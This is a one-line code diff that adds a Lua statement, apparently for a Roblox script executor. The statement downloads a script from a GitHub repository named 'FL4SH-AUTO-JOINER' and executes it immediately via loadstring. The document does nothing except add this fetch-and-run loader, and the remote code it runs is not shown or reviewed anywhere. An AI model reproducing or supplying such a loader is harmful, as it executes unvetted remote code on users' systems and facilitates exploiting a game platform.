@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FL4SH-1/FL4SH-AUTO-JOINER/refs/heads/main/Script"))()
